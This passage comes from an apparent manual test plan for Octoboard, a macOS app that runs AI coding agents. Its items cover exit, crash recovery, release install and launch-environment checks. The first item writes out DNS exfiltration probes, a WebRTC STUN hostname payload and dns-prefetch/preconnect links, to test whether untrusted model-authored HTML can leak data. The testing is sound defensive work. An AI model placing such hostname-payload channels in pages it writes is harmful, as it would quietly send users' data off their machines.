      one channel that was found and measured — a page navigating its own frame — but CSP has no directive WebKit
      enforces over WebRTC or over link-based DNS prefetch, and both are reachable with the `allow-scripts` the panel
      grants. A page could carry a payload in a hostname: `new RTCPeerConnection({iceServers:[{urls:"stun:<payload>.…"}]})`
      followed by `createOffer()`/`setLocalDescription()`, or a static or dynamically inserted
      `<link rel="dns-prefetch">` / `rel="preconnect">`. Neither has been exercised, so nothing is established either
      way; the product docs claim only what was measured. Observe it at the **DNS layer** — these channels leak through
      a name lookup, so an HTTP listener sees nothing even when the leak works — and give each probe a positive control,
      since a check expecting "no" proves nothing without one. Two things make this awkward and are worth knowing before
      starting: `tcpdump` needs a password, and the window's own policy blocks every in-app channel, so there is no
      in-app request to use as the control (Safari's lookups go through the same WebKit networking path and can serve as
      one instead). A non-root observation point that was validated: `log stream --predicate 'process == "mDNSResponder"'
      --style compact` logs every lookup, and although hostnames are redacted, the mask hash is name-derived and stable
      within a boot — so looking the same names up from a shell afterwards yields the hashes to search the capture for.
      Needs a person only in that the screen must be unlocked: the panel renders only for a *selected* hub session, and
      the application auto-selects only a session it opened itself, so mounting it takes a real click. If a leak is
      found, there is nothing in CSP to fix it with — record it as a limitation of showing untrusted model-authored HTML
      and say so in `docs/product/report-panel.md`.

      **How to run it**
      - **Setup**: per the screen-unlock/real-click and no-root notes above; a console with a live hub session;
        Safari, to run each probe's own positive control; one shell free to run lookups while another runs the
        capture.
      - **Steps**:
        1. Start the capture and keep it running for the whole test: `log stream --predicate 'process == "mDNSResponder"'
           --style compact | tee /tmp/octoboard-dns-capture.log`.
        2. **Positive control for the observation method itself** (not for the app): generate a token first
           (`token=$(uuidgen)`), then in Safari visit `http://octoboard-control-$token.invalid/`. Right after, in the
           free shell, run `dscacheutil -q host -a name octoboard-control-$token.invalid` to force the identical
           lookup again, and confirm its mask hash in the capture matches the hash the earlier Safari lookup
           produced. This proves the capture-plus-afterward-lookup technique recovers which hostname an entry is — it
           says nothing yet about whether any of the four probe mechanisms below produce a lookup anywhere at all. If
           this control itself produces no logged lookup, do not conclude anything from it yet: RFC 6761 reserves
           `.invalid` and tells resolvers they should answer it locally rather than querying, so this build's
           `mDNSResponder` may simply not log `.invalid` names at all — re-run this control under a name in a real
           delegated zone before drawing any conclusion, since a systematic `.invalid` short-circuit would silently
           take out every probe below along with it.
        3. **Positive control for each probe mechanism** (still outside the app, per
           `docs/memory/verifying-the-desktop-ui.md`'s rule that this window's own positive controls have to come
           from outside it): for each of the four mechanisms exercised in steps 5 and 7 below, save the same markup or
           script as a plain local HTML file, open it directly in Safari with a fresh token, and repeat the
           `dscacheutil` check from step 2 for that token. Only a mechanism whose Safari control succeeds can tell
           you anything once it is tried through the app's panel; a mechanism that never produces a visible lookup in
           Safari either means this WebKit/macOS build does not expose that channel to the technique at all — record
           that plainly rather than reading it as the app having blocked it.
        4. Click the console's hub row so the report panel mounts.
        5. Ask the hub to call `show_page` with an `html` body running the WebRTC probe, using a fresh random token as
           the payload: `new RTCPeerConnection({iceServers:[{urls:"stun:<token>.invalid"}]})` followed by
           `pc.createOffer().then(o => pc.setLocalDescription(o))`. Keep this page selected as the newest page for
           the whole wait in the next step — paging away stops its scripts (`docs/product/report-panel.md`).
        6. A few seconds after the page loads, run `dscacheutil -q host -a name <token>.invalid` from the shell and
           search the capture (taken *before* this lookup) for a matching hash — a match means the earlier page
           attempt already caused that same lookup.
        7. Repeat steps 5–6 for the DNS-prefetch/preconnect channel: a page with `<link rel="dns-prefetch"
           href="http://<token2>.invalid/">` present in the initial markup, and again with the `<link>` inserted by a
           script after load, and again with `rel="preconnect"`. Keep each page selected for its own wait, same as
           step 5.
      - **Pass criterion**: for each of the four mechanisms whose Safari control (step 3) succeeded, no token hash
        appears in the capture taken while the app's page ran — a hash that does appear is a confirmed leak. A
        mechanism whose Safari control never produced a lookup proves nothing about the app either way and is
        reported separately, not folded into a pass.
      - **Record**: for each mechanism — whether its Safari control (step 3) succeeded, the token used in the app's
        page, whether its hash appeared, and if so how long after the page loaded. Also record the positive-control
        match from step 2. If a leak is found, write it into `docs/product/report-panel.md` as a limitation (there is
        no CSP fix for it) rather than opening a bug.

- [ ] **The hub and its projects on different agents.** Confirm a console whose hub is one agent and whose projects
      default to another orchestrates normally, and that the hub's `start_session` `agent` argument overrides a
      project's default for that one session.

      **How to run it**
      - **Setup**: one console whose hub agent (e.g. Codex) differs from its projects' default agents (e.g. Claude Code
        and Grok Build on two different projects).
      - **Steps**:
        1. Open the hub and ask it to `list_projects`, then `start_session` into one project with no `agent` argument.
           Check the launched session's agent badge in the tree — it should match that project's own default, not the
           hub's agent.
        2. Ask the hub to `start_session` into the same project again, this time explicitly naming a different `agent`.
           Check that this session alone launches with the overriding agent.
        3. Let both sessions do something small and `report` back; confirm the hub receives both reports normally.
      - **Pass criterion**: a session started with no override uses its project's default agent (never the hub's); an
        explicit `agent` argument overrides it for exactly that one session; reporting works across the agent boundary
        in both directions.
      - **Record**: the console/project agent configuration used, the agent each launched session actually ran under
        (read from its badge), and confirmation that both reports reached the hub.

- [ ] **The release bundle on a clean machine.** The signed and notarized `.dmg` was verified here as far as a single
      machine allows: `spctl` admits both the `.app` and the `.dmg` as `Notarized Developer ID`, including from a copy
      carrying the quarantine attribute, and `codesign --verify --deep --strict` validates the nested `octoboardd`
      sidecar with it. What that cannot show is the application actually installing and running somewhere it has never
      been built — a machine with none of the toolchain, none of the agent CLIs, and no prior trust. Install from the
      `.dmg` on a clean macOS machine (or at minimum a fresh user account, with a copy that was genuinely downloaded)
      and confirm it launches, starts its bundled daemon and opens a session.

      **How to run it** (do this in the same sitting as "The launch environment from a Finder-started application"
      below — both want a double-clicked bundle)
      - **Setup**: a genuinely separate macOS machine with none of the toolchain, no agent CLI and no prior trust (a
        fresh user account on this machine is the fallback); Developer ID signing/notarization credentials already set
        up per "Release builds" in `app/README.md`; a way to actually download the `.dmg` on the clean side so it picks
        up a real quarantine attribute.
      - **Steps**:
        1. On the build machine, from `app/`, with `APPLE_SIGNING_IDENTITY` and either the `APPLE_ID` +
           `APPLE_PASSWORD` + `APPLE_TEAM_ID` trio or the `APPLE_API_KEY` trio exported, run `npm run release`. This
           produces and self-verifies `src-tauri/target/release/bundle/macos/Octoboard.app` and
           `src-tauri/target/release/bundle/dmg/Octoboard_<version>_aarch64.dmg` (the version comes from
           `app/src-tauri/tauri.conf.json`, currently `0.1.0`).
        2. Put the `.dmg` somewhere reachable from the clean machine and download it there through a real browser
           download, not a local copy — confirm with `xattr -p com.apple.quarantine Octoboard_*.dmg` that it actually
           carries the attribute.
        3. On the clean machine/account: double-click the `.dmg`, drag `Octoboard.app` into `/Applications`, then
           double-click it. Confirm no Gatekeeper override (no right-click "Open") is needed.
        4. Confirm the bundled daemon started: `ps -axo pid,command | grep octoboardd` should show it running from
           inside the installed `.app`.
        5. Open a session in any available project directory, on whichever agent CLI is installed there (install at
           least one first if none is present — without one this step only confirms the app's own startup).
      - **Pass criterion**: the app opens straight from the quarantined, downloaded `.dmg` with no Gatekeeper override;
        its own `octoboardd` process is running; opening a session either starts a real agent process, or — if no agent
        CLI is present — fails with the "`<name>` was not found on PATH in the snapshotted shell environment" message
        (`daemon/src/env_shell.rs:439`; see "Opening a session" in `docs/product/sessions.md` for where that failure
        surfaces — no session appears in the tree and the failure is reported) rather than a silent hang.
      - **Record**: which machine/account was used, whether any agent CLI was pre-installed, the exact Gatekeeper
        prompt seen (if any) on first open, confirmation the daemon process was running, and the session-open outcome.

- [ ] **The exit flow by hand.** Each gesture, with at least one live session: the window's close button, Cmd+Q, the
      application menu's Quit, the Dock icon's own Quit, and a system-initiated logout — the first three were exercised
      before this round, the last two are new and reach the confirmation through an `applicationShouldTerminate:`
      override that no automated check here can trigger. Confirm each asks, that answering it terminates the sessions
      and the daemon with no orphan processes left, and that cancelling leaves everything running. Then the escape
      hatch in both directions: a quick second quit gesture on a *healthy* window must still ask (the frontend's
      heartbeat resets the window), while with a deliberately wedged webview the second gesture within two seconds must
      quit without asking — that is the only thing standing between a dead webview and a process only a force-quit can
      end.

      **How to run it**
      - **Setup**: the packaged app running with at least one live session on each attempt, so quitting has something
        to confirm about; for the wedged-webview case, a plain local debug build — `app/src-tauri/Cargo.toml` ships
        `tauri = { version = "=2.11.6", features = [] }`, so the packaged *release* bundle's webview is never marked
        inspectable (which is what the `devtools` Cargo feature exists to override for a release build); nothing in
        `app/src-tauri/src/` or `tauri.conf.json` references devtools or `inspectable`, so a plain `cargo build`
        (debug) is already inspectable by Tauri's own default, with no feature flag needed at all — there is in fact
        no `[features]` table on this crate, so `cargo build --features devtools` fails outright (`the package
        'octoboard' does not contain this feature: devtools`); the only valid spelling, `tauri/devtools`, would just
        be redundant on a debug build. Inference, not a recorded fact: on macOS 13.3+ `WebKitDeveloperExtras` likely
        does not substitute for this, and the Develop-menu route is probably Safari-only — `docs/memory/verifying-
        the-desktop-ui.md` records only that in this app devtools can be opened by keystroke injection needing
        Accessibility permission, and says nothing about Safari's Develop menu as a devtools route either way (it
        does mention Safari elsewhere, as the network probe's positive control, which is a different claim);
        confirm both by hand before relying on them. Run the debug build, connect to its window from Safari's
        Develop menu, and have `while(true){}` ready to paste into its console.
      - **Steps**:
        1. Before triggering anything, find the agent process's pid for the session under test and confirm the
           daemon's own pid, per "Finding the right pid, and proving it is gone" in "Notes for developers" below.
           Then, for each of close button / Cmd+Q / app-menu Quit, with a live session: trigger it, confirm the
           confirmation dialog appears, click **Cancel**, confirm the session is still running (its row still shows
           a live status, not Interrupted). Trigger it again and this time click **Confirm**; confirm the session
           moves to Interrupted and that both the daemon and the agent process are gone — `pgrep -x octoboardd`
           should print nothing and exit non-zero, and `ps -p <the agent pid noted above> -o pid=` should print
           nothing and exit non-zero (re-capture a fresh pid with `ps -axo pid,command | grep <session id>` before
           each gesture's own test, since a new agent process starts each time the session is reopened).
        2. Dock icon's own Quit: right-click (or long-press) the Dock icon → Quit. Repeat the cancel/confirm pair from
           step 1 and confirm it behaves identically — this is the new `applicationShouldTerminate:` path.
        3. System-initiated logout: with a live session, choose Apple menu → Log Out. Confirm the same confirmation
           dialog appears and blocks the logout until answered; Cancel aborts the logout and leaves the session
           running; Confirm lets the logout proceed and leaves the session Interrupted on the next launch.
        4. Healthy-window double gesture: with a live session, press Cmd+Q twice within under two seconds. Confirm the
           confirmation dialog still appears (does not get skipped on the second press).
        5. Wedged-webview double gesture: paste `while(true){}` into the window's Web Inspector console to hang the
           page. Before relying on that, confirm the page is actually wedged — click the window's own close button
           and confirm it does nothing (per "Quitting when the window has stopped responding" in
           `docs/product/application-lifecycle.md`, a wedged window ignores its own close button; if the close
           button still works, the page never actually hung and the rest of this step proves nothing). Then press
           Cmd+Q twice within two seconds. Confirm the second press quits immediately with no dialog.
      - **Pass criterion**: every gesture in steps 1–3 asks before ending sessions, leaves everything running on
        Cancel, and leaves no orphan process on Confirm; step 4 still asks; step 5 quits without asking on the second
        press within the two-second window.
      - **Record**: a checklist with one row per gesture (close button / Cmd+Q / app-menu Quit / Dock Quit / logout),
        each with its cancel-path outcome, confirm-path outcome, and orphan-process check result, plus pass/fail for
        the healthy and wedged double-gesture cases.

- [ ] **Crash and interruption recovery.** Force-quit the application and confirm the daemon notices through its
      `--parent-pid` watchdog and takes its sessions down with it; kill the daemon directly and confirm the application
      reports the lost connection; then start again and confirm every session that was running comes back marked
      interrupted and resumes. The paths are all implemented and unit-covered, but nothing has exercised them against a
      real packaged application.

      **How to run it**
      - **Setup**: the packaged app running with one or more live sessions.
      - **Steps**:
        1. Before force-quitting, find the agent process's pid for the session under test and confirm the daemon's
           own pid, per "Finding the right pid, and proving it is gone" in "Notes for developers" below. Then
           force-quit the application (Activity Monitor → Octoboard → Force Quit, or `kill -9 <Octoboard pid>`)
           while that session is running.
        2. Shortly after, confirm the watchdog took the daemon and every agent process down with it: `pgrep -x
           octoboardd` should print nothing and exit non-zero, and `ps -p <the agent pid noted above> -o pid=`
           should print nothing and exit non-zero either — no orphans.
        3. On a fresh run, instead kill only the daemon: find it with `ps -axo pid,command | grep octoboardd` and
           `kill <pid>`. With the application still running, confirm it shows the lost-connection banner from "Losing
           the daemon connection" in `docs/product/application-lifecycle.md` (the retry backoff, then a Retry button)
           rather than freezing silently.
        4. Relaunch Octoboard, which starts a fresh daemon. Confirm every session that was running at the moment of the
           crash/kill now shows Interrupted, and that each resumes correctly when selected.
      - **Pass criterion**: after a force-quit, no `octoboardd` and no agent process survive; after killing only the
        daemon, the running app visibly reports the dropped connection; after relaunch, every previously-running
        session reads Interrupted and resumes.
      - **Record**: the pids checked and their state before/after each kill, the exact wording of the lost-connection
        banner seen, and the resume outcome (conversation resumed vs. a fresh one, per "Archiving, interruption and
        resuming" in `docs/product/sessions.md`) for each session.

- [ ] **The launch environment from a Finder-started application.** The per-launch login-shell snapshot is what gives an
      agent the user's real `PATH` and keys when Octoboard is started from Finder rather than a terminal, and it is now
      bounded by a ten-second deadline that refuses the launch rather than hanging. Double-click the installed
      application and start a session on each of the three agents: confirm the agent binary resolves, the user's keys
      are present, and no launch is refused by the new bound on a normal shell configuration. Worth doing in the same
      sitting as the clean-machine check above, since both want a double-clicked bundle.

      **How to run it** (batch with "The release bundle on a clean machine" above — both need a double-clicked bundle)
      - **Setup**: the installed `.app`, this machine's normal shell configuration already in place (the real
        `.zshrc`/`.zprofile` with the usual `PATH` entries and API keys), Finder or the Dock to launch it — never a
        terminal, since that would skip the exact gap this check covers.
      - **Steps**:
        1. Quit any terminal-launched Octoboard instance first.
        2. Double-click Octoboard in Finder (or launch it from Launchpad/the Dock).
        3. Open a session on each of the three agents in turn, in any project directory, with no initial task — per
           the development note below, a taskless session is enough to prove the launch half, at zero model-turn cost.
           For each:
           - confirm the session reaches *awaiting instructions* rather than an immediate launch failure, and
             cross-check with `ps -axo pid,command | grep '<agent binary>'` (`claude`, `codex` or `grok`, matching the
             agent being tested — see `docs/mvp.md` §6) that the process is actually running;
           - look for that session's own `octoboardd mcp` child with `ps -axo pid,command | grep <session id>` — it
             only starts once the agent binary itself resolved and launched, which is indirect proof the environment
             carried through that far;
           - give the session one real prompt that needs the credential (or ask it directly who it is logged in as) to
             confirm the user's keys made it into the launch environment, not just the `PATH`.
        4. Confirm none of the three launches was refused for any of the three reasons named in "The launch
           environment" in `docs/product/launching-agents.md` (the capture ran out of time, the shell exited with an
           error, or it exited cleanly without a complete dump) — the exact wording for each sits at
           `daemon/src/env_shell.rs:181` (the error-exit case), `:362` (the incomplete-dump case) and `:410-411`
           (the ten-second timeout: "`… did not finish within 10s`; a shell startup file is probably blocked on
           something other than stdin, or it left a background process holding the shell's output open …").
      - **Pass criterion**: all three agent binaries resolve and launch, each session's credential-dependent prompt
        succeeds (or the agent reports itself logged in), and no launch is refused by the ten-second capture bound.
      - **Record**: per agent — the launch outcome, whether the credential-dependent prompt succeeded, and whether the
        `octoboardd mcp` child was found. Note the shell type and which startup files are in play, so a future failure
        has something to compare against.

## Notes for developers

- **Development notes**: none of these is automatable. `StopFailure` needs the user to authorise pointing Grok's chat
  endpoint somewhere it will fail; the latency figure needs the real application's render loop instrumented; the
  orchestration items need real model turns, a running application and, for the raised hand, a person to answer a
  permission dialog. Gatekeeper admission itself is settled — `spctl` was run against a quarantined copy — and what is
  left of it here is only what one machine cannot show.
  Launching a session without a task costs no model turn and still proves the per-launch injection took: each agent
  connects its MCP servers at startup, so the `octoboardd mcp` child appearing for that session is the proof. That is
  how the injection half was settled; only the turn-level half is left.
  One technique worth reusing for the first item: pointing an agent at a local HTTP server that returns an error and dumps
  the request body makes its assembled prompt and its error-path behaviour readable at zero token cost. That is exactly
  what makes it credential-sensitive, which is why it needs authorisation rather than being done quietly.
- **Finding the right pid, and proving it is gone**: used by both "The exit flow by hand" and "Crash and interruption
  recovery". `pgrep -f <agent binary>` cannot be used to find a session's agent process, because it matches any
  process whose full argv contains that string, not just Octoboard's own — on a desktop with the Claude and ChatGPT
  apps installed, `pgrep -f claude` and `pgrep -f codex` each match more than a dozen of those apps' own unrelated
  helper processes, a count that is a snapshot of whichever desktop apps happen to be running and will not reproduce
  on another machine. Use `ps -axo pid,command | grep <session id>` instead, the per-session discriminator
  `docs/memory/probing-agent-clis.md` prescribes. For the daemon itself, `pgrep -x octoboardd` is sound as both a
  presence and an absence check: the sidecar is bundled as `Contents/MacOS/octoboardd` (`app/scripts/release.mjs:80`,
  `tauri.conf.json:28`), so its `comm` is exactly `octoboardd` and `-x` cannot match anything unrelated — unlike
  `ps -axo pid,command | grep octoboardd`, which always matches its own grep process and so can never read as
  absent. For an absence check on a specific pid (an agent process that should be gone), plain `ps -p <pid>` is not
  it: it prints a header row (`  PID TTY           TIME CMD`) even when nothing matches, so a reader following "`ps
  -p <pid>` should print nothing" sees output and reads the process as still alive. Use `ps -p <pid> -o pid=`
  instead, which prints nothing and exits non-zero when the pid is gone (verified: `ps -p 99999 -o pid=` on this
  machine).
- **Reference docs**: the conditions each of these qualifies are in `docs/mvp.md`, sections 4.4, 5.3 and 6.
